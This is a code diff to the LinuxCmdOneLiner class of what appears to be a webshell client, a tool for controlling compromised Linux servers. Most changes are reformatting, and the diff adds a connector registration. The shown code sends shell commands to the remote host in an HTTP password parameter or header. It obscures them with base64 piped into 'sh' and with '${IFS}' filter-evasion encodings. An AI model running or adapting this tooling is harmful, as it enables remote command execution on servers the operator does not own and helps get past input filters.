@@ -279,7 +279,9 @@ class LinuxCmdOneLiner:
 
             filetype = perm[0]
             perm = parse_file_permission(perm[1:10])
-            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(filetype, "unknown")
+            filetype = {"-": "file", "f": "file", "d": "dir", "l": "link"}.get(
+                filetype, "unknown"
+            )
             if filetype == "link":
                 filetype = "link-dir" if name.endswith("/") else "link-file"
                 name = name.split(" ->")[0]
@@ -288,7 +290,10 @@ class LinuxCmdOneLiner:
                     name=name,
                     permission=perm,
                     filesize=int(filesize),
-                    entry_type=t.cast(t.Literal["dir", "file", "link-dir", "link-file", "unknown"], filetype)
+                    entry_type=t.cast(
+                        t.Literal["dir", "file", "link-dir", "link-file", "unknown"],
+                        filetype,
+                    ),
                 )
             )
         return result
@@ -509,7 +514,7 @@ class LinuxCmdOneLiner:
                     cmd_parts.extend(["--data-binary", f"@{temp_file}"])
                 else:
                     try:
-                        data_str = data.decode('utf-8')
+                        data_str = data.decode("utf-8")
                         cmd_parts.extend(["--data", data_str])
                     except UnicodeDecodeError:
                         cmd_parts.extend(["--data", data_b64])
@@ -554,11 +559,7 @@ class LinuxCmdOneLiner:
         body = "\n".join(body_lines)
         body_bytes = body.encode() if body else b""
 
-        return {
-            "status_code": status_code,
-            "headers": headers_dict,
-            "body": body_bytes
-        }
+        return {"status_code": status_code, "headers": headers_dict, "body": body_bytes}
 
     async def get_basicinfo(self):
         # TODO: 多加一点命令
@@ -586,12 +587,24 @@ class LinuxCmdOneLiner:
             start2=start2,
             code=payload if isinstance(payload, str) else shell_command(payload),
             stop=stop,
-            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, "")
+            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, ""),
         )
         if self.encoder == "base64_quote":
-            code = shell_command(["sh", "-c", "echo " + base64.b64encode(code.encode()).decode() + "|base64 -d|sh"])
+            code = shell_command(
+                [
+                    "sh",
+                    "-c",
+                    "echo "
+                    + base64.b64encode(code.encode()).decode()
+                    + "|base64 -d|sh",
+                ]
+            )
         elif self.encoder == "base64_ifs":
-            code = "sh -c echo${IFS}" + base64.b64encode(code.encode()).decode() + "|base64${IFS}-d|sh"
+            code = (
+                "sh -c echo${IFS}"
+                + base64.b64encode(code.encode()).decode()
+                + "|base64${IFS}-d|sh"
+            )
         elif self.encoder == "raw":
             pass
         else:
@@ -635,7 +648,9 @@ class LinuxCmdOneLiner:
                     payload_b64 = base64.b64encode(payload).decode()
                 else:
                     payload_b64 = base64.b64encode(payload.encode()).decode()
-                kwargs["headers"][self.password] = f"echo {payload_b64} | base64 -d | sh"
+                kwargs["headers"][
+                    self.password
+                ] = f"echo {payload_b64} | base64 -d | sh"
             else:
                 kwargs["data"][self.password] = payload
             response = await self.client.request(
@@ -649,4 +664,28 @@ class LinuxCmdOneLiner:
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
         except httpx.HTTPError as exc:
-            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
+            raise exceptions.NetworkError(
+                "发送HTTP请求到受控端失败：" + str(exc)
+            ) from exc
+
+
+import uuid
+from ..session_connector import DirectSessionConnector, register_direct_connector
+from .linux_cmd_oneliner import LinuxCmdOneLiner
+
+
+@register_direct_connector
+class LinuxCmdOneLinerConnector(DirectSessionConnector):
+    connector_name = "LINUX_CMD_ONELINER"
+    connector_name_readable = "Linux命令执行"
+    session_class = LinuxCmdOneLiner
+    options = LinuxCmdOneLiner.conn_options
+
+    def get_session_type(self) -> str:
+        return self.session_class.session_type
+
+    def build_session(self, config: dict):
+        return self.session_class(config)
+
+    async def close_session(self, config: dict):
+        pass
